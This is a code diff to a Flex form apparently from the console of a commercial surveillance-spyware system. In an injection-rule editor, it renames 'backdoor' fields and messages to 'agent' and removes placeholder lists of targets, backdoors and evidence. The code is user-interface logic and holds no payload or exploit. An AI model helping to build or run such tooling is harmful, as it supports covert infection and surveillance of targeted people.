@@ -58,9 +58,9 @@
             
           } else {
             
-            for each (var b:Object in backdoor.dataProvider) {
+            for each (var b:Object in agent.dataProvider) {
               if (b._id == rule.action_param) {
-                backdoor.selectedItem = b;
+                agent.selectedItem = b;
                 break;
               }
             }
@@ -97,9 +97,9 @@
           hasError = true;
         }
         
-        backdoor.errorString = '';
-        if (action.selectedItem != 'REPLACE' && !backdoor.selectedItem) {
-          backdoor.errorString = 'Please select a backdoor';
+        agent.errorString = '';
+        if (action.selectedItem != 'REPLACE' && !agent.selectedItem) {
+          agent.errorString = 'Please select an agent';
           hasError = true;
         }
         
@@ -123,8 +123,8 @@
       private function manageInject():void
       {
         populateCommonProperties();
-        rule.action_param = backdoor.selectedItem ? backdoor.selectedItem._id : null;
-        rule.action_param_name = backdoor.selectedItem ? backdoor.selectedItem.label : null;
+        rule.action_param = agent.selectedItem ? agent.selectedItem._id : null;
+        rule.action_param_name = agent.selectedItem ? agent.selectedItem.label : null;
         
         saveRule();
       }
@@ -191,46 +191,6 @@
     ]]>
   </fx:Script>
   
-  <fx:Declarations>
-    <s:ArrayCollection id="dataProvider">
-      
-      <fx:Object label="Target 1" _id="4e314a052afb65157900005a" type="target"/>
-      <fx:Object label="Backdoor 1" type="backdoor"/>
-      <fx:Object label="Evidence 1" type="evidence"/>
-      <fx:Object label="Operation 1" type="operation"/>
-      
-      <fx:Object label="Target 2" type="target"/>
-      <fx:Object label="Backdoor 2" _id="RCS_0002" type="backdoor"/>
-      <fx:Object label="Evidence 2" type="evidence"/>
-      <fx:Object label="Operation 2" type="operation"/>
-      
-      <fx:Object label="Target 3" type="target"/>
-      <fx:Object label="Backdoor 3" type="backdoor"/>
-      <fx:Object label="Evidence 3" type="evidence"/>
-      <fx:Object label="Operation 3" type="operation"/>
-      
-      <fx:Object label="Target 4" type="target"/>
-      <fx:Object label="Backdoor 4" type="backdoor"/>
-      <fx:Object label="Evidence 4" type="evidence"/>
-      <fx:Object label="Operation 4" type="operation"/>
-      
-      <fx:Object label="Target 5" type="target"/>
-      <fx:Object label="Backdoor 5" type="backdoor"/>
-      <fx:Object label="Evidence 5" type="evidence"/>
-      <fx:Object label="Operation 5" type="operation"/>
-      
-      <fx:Object label="Target 6" type="target"/>
-      <fx:Object label="Backdoor 6" type="backdoor"/>
-      <fx:Object label="Evidence 6" type="evidence"/>
-      <fx:Object label="Operation 6" type="operation"/>
-      
-      <fx:Object label="Target 7" type="target"/>
-      <fx:Object label="Backdoor 7" type="backdoor"/>
-      <fx:Object label="Evidence 7" type="evidence"/>
-      <fx:Object label="Operation 7" type="operation"/>
-      
-    </s:ArrayCollection>
-  </fx:Declarations>
   
   <utils:states>
     <s:State name="normal"/>
@@ -252,7 +212,7 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <items:SearchField id="target" width="200" dataProvider="{dataProvider}" kinds="{['target']}"></items:SearchField>
+      <items:SearchField id="target" width="200" dataProvider="{null}" kinds="{['target']}"></items:SearchField>
     </s:FormItem>
     
     <s:FormItem label="{R.get('IDENT')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
@@ -295,10 +255,10 @@
     
     
     
-    <s:FormItem label="{R.get('BACKDOOR')}" skinClass="it.ht.rcs.console.skins.CompactFormItem"
+    <s:FormItem label="{R.get('AGENT')}" skinClass="it.ht.rcs.console.skins.CompactFormItem"
                 visible="{action.selectedItem != 'REPLACE'}" includeInLayout="{action.selectedItem != 'REPLACE'}">
       
-      <items:SearchField id="backdoor" width="200" dataProvider="{dataProvider}" kinds="{['backdoor']}"></items:SearchField>
+      <items:SearchField id="agent" width="200" dataProvider="{null}" kinds="{['agent']}"></items:SearchField>
       
     </s:FormItem>
     
